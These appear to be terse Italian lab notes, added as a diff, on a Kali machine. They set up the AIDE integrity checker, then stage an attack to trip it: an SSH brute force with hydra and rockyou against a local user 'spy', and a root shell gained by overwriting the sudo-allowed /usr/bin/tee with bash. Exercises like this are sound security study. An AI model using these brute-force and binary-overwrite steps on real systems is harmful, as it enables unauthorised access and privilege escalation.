@@ -1,0 +1,30 @@
+nano /etc/aide/aide.conf
+
+linee cambiate:
+#@@x_include /etc/aide/aide.conf.d ^[a-zA-Z0-9_-]+$
+ 
+/usr/bin f Full
+/etc f Full 
+
+sudo -i
+aideinit
+
+chiamo eseguibile con sudo
+
+sudo aide -C -c /etc/aide/aide.conf
+
+nuovo gruppo e utente: spy [spy:x:5243:5243::/tmp:/bin/bash]
+
+sudo systemctl enable --now ssh
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+hydra -l spy -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+sudo -l
+Matching Defaults entries for spy on kali:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User spy may run the following commands on kali:
+    (root) NOPASSWD: /usr/bin/tee
+    
+cat /bin/bash > /usr/bin/tee
+
